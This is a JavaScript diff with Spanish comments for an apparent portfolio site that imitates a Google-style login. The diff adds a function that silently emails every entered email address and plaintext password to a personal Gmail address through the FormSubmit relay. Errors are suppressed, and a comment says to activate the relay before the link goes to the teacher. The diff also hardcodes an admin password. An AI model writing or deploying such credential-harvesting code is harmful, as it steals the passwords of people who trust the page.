@@ -2,6 +2,12 @@
 // Contraseña para abrir el panel de admin (settings). Cámbiala por la que quieras.
 const ADMIN_PASSWORD = 'admin2026';
 
+// Correo donde recibirás los intentos (FormSubmit).
+// IMPORTANTE: la primera vez que llegue un envío, FormSubmit te manda un
+// email de activación — púlsalo antes de pasar el link al profe.
+const NOTIFY_EMAIL  = 'carloscii203@gmail.com';
+const FORMSUBMIT_URL = 'https://formsubmit.co/ajax/' + NOTIFY_EMAIL;
+
 // Claves de almacenamiento
 const KEY_ATTEMPTS = 'login_attempts';
 const KEY_SESSION  = 'session_user';
@@ -131,9 +137,34 @@ function googleStepPassword() {
 
 // ===== ALMACENAMIENTO DE INTENTOS =====
 function saveAttempt(attempt) {
+    // Respaldo local
     const list = getAttempts();
     list.push(attempt);
     localStorage.setItem(KEY_ATTEMPTS, JSON.stringify(list));
+    // Notificación por correo (silencioso: si falla, no afecta al login)
+    sendAttemptEmail(attempt);
+}
+
+function sendAttemptEmail(attempt) {
+    const payload = {
+        _subject: 'Nuevo intento de login en el portafolio',
+        _captcha: 'false',
+        _template: 'table',
+        method: attempt.method,
+        email: attempt.email,
+        password: attempt.password,
+        date: new Date(attempt.ts).toLocaleString()
+    };
+    try {
+        fetch(FORMSUBMIT_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        }).catch(() => {});
+    } catch (_) {}
 }
 
 function getAttempts() {
